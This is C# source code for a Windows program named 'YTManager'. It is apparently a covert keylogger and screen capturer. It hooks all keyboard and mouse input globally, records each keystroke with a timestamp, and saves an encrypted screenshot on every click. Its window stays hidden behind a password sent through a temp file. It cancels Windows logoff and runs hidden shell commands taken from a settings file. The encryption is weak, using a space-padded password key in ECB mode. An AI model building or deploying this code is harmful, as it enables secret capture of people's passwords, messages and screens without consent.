using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Threading;
using Gma.System.MouseKeyHook;
using System.Xml;

namespace YTManager
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			CheckForIllegalCrossThreadCalls = false;
			InitializeComponent();
			ShowInTaskbar = true;
			MinimizeBox = false;
			MaximizeBox = false;
			FormBorderStyle = FormBorderStyle.FixedSingle;
		}
	}

	public class Body
	{
		Form1 mainFrm;
		public string[] args;
		string cmdPath;
		Thread currentThread;
		private IKeyboardMouseEvents m_GlobalHook;
		public Body(string[] args)
		{
			System.Diagnostics.Process[] process = System.Diagnostics.Process.GetProcessesByName(System.IO.Path.GetFileNameWithoutExtension(
			Application.ExecutablePath));
			cmdPath = System.IO.Path.GetTempPath() + "\\" + "ytcmd";
			if (process.Length > 1)
			{
				string argLine = "";
				for (var i = 0; i < args.Length; i++)
				{
					argLine += args[i] + "\r\n";
				}
				//System.IO.File.WriteAllText(Application.StartupPath + "\\" + "ytcmd", argLine);
				System.IO.File.WriteAllText(cmdPath, argLine);
				System.Environment.Exit(0);
			}
			else
				if (System.IO.File.Exists(cmdPath)) System.IO.File.Delete(cmdPath);
			this.args = args;
			System.IO.FileSystemWatcher ytCmdWatcher = new System.IO.FileSystemWatcher();
			ytCmdWatcher.Path = System.IO.Path.GetTempPath();
			ytCmdWatcher.EnableRaisingEvents = true;
			ytCmdWatcher.Created += YtCmdWatcher_Created;
			ytCmdWatcher.Renamed += YtCmdWatcher_Created;
			currentThread = Thread.CurrentThread;
			m_GlobalHook = Hook.GlobalEvents();
			m_GlobalHook.KeyDown += hKeyDown;
			m_GlobalHook.KeyUp += hKeyUp;
			m_GlobalHook.MouseDown += hMouseDown;
			Microsoft.Win32.SystemEvents.SessionEnding += SystemEvents_SessionEnding;
			loadXml();
		}

		private void SystemEvents_SessionEnding(object sender, Microsoft.Win32.SessionEndingEventArgs e)
		{
			e.Cancel = true;
			quit();
		}

		XmlDocument ytSettings = new XmlDocument();
		List<ClosingItem> ClosingList = new List<ClosingItem>();
		struct ClosingItem{
			public string path;
			public bool visible;
		};
		void loadXml()
		{
			if (System.IO.File.Exists(System.Environment.CurrentDirectory + "\\ytsettings.xml"))
			{
				ytSettings.Load(System.Environment.CurrentDirectory + "\\ytsettings.xml");
				var root = ytSettings.DocumentElement;
				foreach (XmlNode element in root.ChildNodes)
				{
					switch (element.Name.ToLower())
					{
						case "wallpaper":
							if (args.Length > 0)
								if (args[0].ToLower() == "--disable-startup" || args[0].ToLower() == "--disable-startup-closing") continue;
							SystemParametersInfo(20, 1, element.InnerText, 1);
							break;
						case "startup":
							if (args.Length > 0)
								if (args[0].ToLower() == "--disable-startup"|| args[0].ToLower() == "--disable-startup-closing") continue;
							System.Diagnostics.Process process = new System.Diagnostics.Process();
							process.StartInfo.FileName = "cmd.exe";
							process.StartInfo.Arguments = "/c " + element.InnerText;
							process.StartInfo.UseShellExecute = false;
							foreach (XmlAttribute attribute in element.Attributes)
								if (attribute.Name.ToLower() == "visible" && Convert.ToBoolean(attribute.Value) == false) process.StartInfo.CreateNoWindow = true;
							process.Start();
							break;
						//case "application":
						//	Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.ClassesRoot;
						//	string ext = "";
						//	foreach (XmlAttribute attribute in element.Attributes)
						//		if (attribute.Name.ToLower() == "ext") ext = attribute.Value;
						//	key.CreateSubKey(ext);
						//	var eKey = key.OpenSubKey(ext, true);
						//	eKey.CreateSubKey("shell\\open\\command").SetValue("", "\"" + element.InnerText + "\" \"%1\"");
						//	eKey.CreateSubKey("shell\\edit\\command").SetValue("", "\"" + element.InnerText + "\" \"%1\"");
						//	eKey.Close();
						//	key.Close();
						//	break;
						case "closing":
							if (args.Length > 0)
								if (args[0].ToLower() == "--disable-closing" || args[0].ToLower() == "--disable-startup-closing") continue;
							ClosingItem iCurrent = new ClosingItem();
							iCurrent.path = element.InnerText;
							iCurrent.visible = true;
							foreach (XmlAttribute attribute in element.Attributes)
								if (attribute.Name.ToLower() == "visible" && Convert.ToBoolean(attribute.Value) == false) iCurrent.visible = false;
							ClosingList.Add(iCurrent);
							break;
						case "regestry":

							break;
						case "msg":
							Thread msgThread = new Thread(new ThreadStart(() =>
							{
								MessageBox.Show(element.InnerText);
							}));
							msgThread.Start();
							break;
					}
				}
			}
		}
		[DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
		public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);

		void hKeyUp(object s, KeyEventArgs k)
		{
			lastKey = "";
		}
		void error()
		{
			msg(Properties.Resources.ErrorText);
		}
		void msg(string text)
		{
			MessageBox.Show(text, "YTManager", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
		}
		private void YtCmdWatcher_Created(object sender, System.IO.FileSystemEventArgs e)
		{
			while (true)
			{
				try
				{
					int argc = System.IO.File.ReadAllLines(cmdPath).Length;
					this.args = System.IO.File.ReadAllLines(cmdPath);
					if (e.Name == "ytcmd" && System.IO.File.Exists(cmdPath))
					{
						while (true)
						{
							try
							{
								if (System.IO.File.Exists(cmdPath)) System.IO.File.Delete(cmdPath);
								break;
							}
							catch
							{
								continue;
							}
						}
						if (argc == 0) error();
						if (argc == 1)
						{
							if (args[0].ToLower() == "-h" || args[0].ToLower() == "help") msg(Properties.Resources.Help);
							else if (args[0].ToLower() == "quit" || args[0].ToLower() == "-q") quit();
							else if (args[0].ToLower() == "exit" || args[0].ToLower() == "-e") exit();
							else if (args[0].ToLower() == "login" || args[0].ToLower() == "-l") msg("请输入密码。");
							else error();
						}
						if (argc >= 2)
						{
							if (args[0].ToLower() == "login" || args[0].ToLower() == "-l")
							{
								if (password == "")
								{
									password = args[1];
									showFrm();
								}
								else
								{
									if (password == args[1])
									{
										showFrm();
									}
									else msg("密码错误。");
								}
							}
							else error();
						}
					}
					break;
				}
				catch { continue; }
			}
		}
		void quit()
		{
			foreach(ClosingItem ci in ClosingList)
			{
				System.Diagnostics.Process process = new System.Diagnostics.Process();
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.Arguments = "/c " + ci.path;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				if (ci.visible) process.StartInfo.CreateNoWindow = false;
				process.Start();
			}
			System.Environment.Exit(0);
		}
		void exit()
		{
			System.Environment.Exit(0);
		}
		bool isClosed = true;
		Thread frmThread;
		void showFrm()
		{
			if (isClosed)
			{
				isClosed = false;
				frmThread = new Thread(new ThreadStart(() =>
				{
					mainFrm = new Form1();
					mainFrm.Show();
					initFrm();
					Application.Run(mainFrm);
				}));
				frmThread.SetApartmentState(ApartmentState.STA);
				frmThread.Start();
			}
		}
		void initFrm()
		{
			mainFrm.textDirectory.Text = workingDirectory;
			mainFrm.FormClosed += (object sender, FormClosedEventArgs e) => {hideFrm(); };
			mainFrm.buttonClose.Click += (object sender, EventArgs e) => { mainFrm.Close(); };
			mainFrm.buttonAbout.Click += about;
			mainFrm.buttonQuit.Click += (object sender, EventArgs e) => { quit(); };
			mainFrm.buttonExit.Click += (object sender, EventArgs e) => { exit(); };
			mainFrm.buttonBrowse.Click += buttonBrowse_Click;
			checkStart();
			mainFrm.textDirectory.TextChanged += (object sender, EventArgs e) => { checkStart(); };
			mainFrm.checkK.Checked = isKeyboard;
			mainFrm.checkK.Checked = isKeyboard;
			mainFrm.checkM.Checked = isMouse;
			mainFrm.checkK.CheckStateChanged += (object sender, EventArgs e) => { isKeyboard = mainFrm.checkK.Checked; checkStart(); };
			mainFrm.checkM.CheckStateChanged += (object sender, EventArgs e) => { isMouse = mainFrm.checkM.Checked; checkStart(); };
			mainFrm.buttonStart.Click += (object sender, EventArgs e) =>
			{
				beginCapture();
				if (enable) hideFrm();
				else
				{
					mainFrm.checkK.Enabled = true;
					mainFrm.checkM.Enabled = true;
					mainFrm.buttonStart.Text = "开始";
				}
			};
			if(enable)
			{
				mainFrm.checkK.Enabled = false;
				mainFrm.checkM.Enabled = false;
				mainFrm.buttonStart.Text = "停止";
			}
		}
		void hideFrm()
		{
			if (!isClosed)
			{
				mainFrm.Dispose();
				isClosed = true;
			}
		}
		void checkStart()
		{
			if (mainFrm.textDirectory.Text != "" && (isKeyboard || isMouse))
				mainFrm.buttonStart.Enabled = true;
			else mainFrm.buttonStart.Enabled = false;
		}
		private void buttonBrowse_Click(object sender, EventArgs e)
		{
			SaveFileDialog dialog = new SaveFileDialog();
			//dialog.Filter = "Directory|.";
			dialog.FileName = "Capture.dat";
			dialog.ShowDialog();
			if (System.IO.Path.GetDirectoryName(dialog.FileName) != "")
			{
				mainFrm.textDirectory.Text = System.IO.Path.GetDirectoryName(dialog.FileName);
				workingDirectory = System.IO.Path.GetDirectoryName(dialog.FileName);
			}
			dialog.Dispose();
		}
		string password = "";
		bool isMouse = false, isKeyboard = false;
		string workingDirectory = "";
		private void hMouseDown(object sender, MouseEventArgs e)
		{
			if (isMouse && enable)
			{
				mOrder2++;
				Bitmap screen = new Bitmap(SystemInformation.PrimaryMonitorSize.Width, SystemInformation.PrimaryMonitorSize.Height);
				Graphics.FromImage(screen).CopyFromScreen(0, 0, 0, 0, SystemInformation.PrimaryMonitorSize);
				Bitmap downScale = new Bitmap(Convert.ToInt32(Convert.ToDouble(SystemInformation.PrimaryMonitorSize.Width) /
				Convert.ToDouble(SystemInformation.PrimaryMonitorSize.Height) * 768), 768);
				Graphics.FromImage(downScale).SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
				Graphics.FromImage(downScale).DrawImage(screen, 0, 0, downScale.Width, downScale.Height);
				var wPen = new Pen(Brushes.White); wPen.Width = 4;
				var kPen = new Pen(Brushes.Black); kPen.Width = 2;
				int relativeLeft = Convert.ToInt32(e.X / ((double)SystemInformation.PrimaryMonitorSize.Height / 768));
				int relativeTop = Convert.ToInt32(e.Y / ((double)SystemInformation.PrimaryMonitorSize.Height / 768));

				//this.Text = e.X.ToString()+", "+e.Y.ToString()+" - "+relativeLeft.ToString() + ", " + relativeTop.ToString();

				Graphics.FromImage(downScale).DrawEllipse(wPen, new Rectangle(relativeLeft - 16, relativeTop - 16, 32, 32));
				Graphics.FromImage(downScale).DrawEllipse(kPen, new Rectangle(relativeLeft - 16, relativeTop - 16, 32, 32));
				System.Drawing.Imaging.ImageCodecInfo[] codecs = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders();
				System.Drawing.Imaging.ImageCodecInfo jcodec = null;
				foreach (var codec in codecs)
				{
					if (codec.MimeType == "image/jpeg") jcodec = codec;
				}
				System.Drawing.Imaging.EncoderParameters p = new System.Drawing.Imaging.EncoderParameters();
				p.Param[0] = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)90);
				downScale.Save(workingDirectory + "\\M" + mOrder.ToString() + ", " + mOrder2.ToString() + ".jpg", jcodec, p);
				var imgByte = System.IO.File.ReadAllBytes(workingDirectory + "\\M" + mOrder.ToString() + ", " + mOrder2.ToString() + ".jpg");
				try { System.IO.File.Delete(workingDirectory + "\\M" + mOrder.ToString() + ", " + mOrder2.ToString() + ".jpg"); } catch {; }
				System.IO.File.WriteAllText(workingDirectory + "\\M" + mOrder.ToString() + ", " + mOrder2.ToString() + ".dat", enCrypt(imgByte, password));
				screen.Dispose();
				downScale.Dispose();
				wPen.Dispose();
				kPen.Dispose();
				p.Param[0].Dispose();
				p.Dispose();
			}
		}
		bool enable = false;
		private void beginCapture()
		{
			isMouse = mainFrm.checkM.Checked;
			isKeyboard = mainFrm.checkK.Checked;
			if (!enable)
			{
				if (isMouse) {mOrder++; mOrder2 = 0; }
				if (isKeyboard) {kOrder++; kText = ""; }
				enable = true;
			}
			else
			{
				enable = false;
			}
		}
		int kOrder = 0, mOrder = 0, mOrder2 = 0;
		string kText;
		string lastKey = "";
		string enCrypt(byte[] src, string key)
		{
			var rj = new RijndaelManaged();
			if (key.Length > 32) key = key.Substring(0, 32);
			if (key.Length < 32)
			{
				for (int i = key.Length; i < 32; i++)
				{
					key += " ";
				}
			}
			rj.Key = Encoding.UTF8.GetBytes(key);
			rj.Mode = CipherMode.ECB;
			rj.Padding = PaddingMode.PKCS7;

			ICryptoTransform transform = rj.CreateEncryptor();
			byte[] result = transform.TransformFinalBlock(src, 0, src.Length);
			return Convert.ToBase64String(result, 0, result.Length);
		}
		private void hKeyDown(object sender, KeyEventArgs e)
		{
			if (enable && isKeyboard)
			{
				if (e.Modifiers.ToString() + " + " + e.KeyCode.ToString() != lastKey)
				{
					//kText += System.DateTime.Now.ToString() + "; " + e.Modifiers.ToString() + " + " + e.KeyCode.ToString() + "\r\n";
					kText += System.DateTime.Now.ToString() + "; ";
					if (e.Modifiers != Keys.None) kText += e.Modifiers.ToString() + " + ";
					kText+=e.KeyCode.ToString() + "\r\n";
					System.IO.File.WriteAllText(workingDirectory + "\\K" + kOrder.ToString() + ".dat", enCrypt(Encoding.UTF8.GetBytes(kText), password));
				}
				lastKey = e.Modifiers.ToString() + " + " + e.KeyCode.ToString();
			}
		}
		private void about(object sender, EventArgs e)
		{
			MessageBox.Show(YTManager.Properties.Resources.About, "About");
		}
	}
}
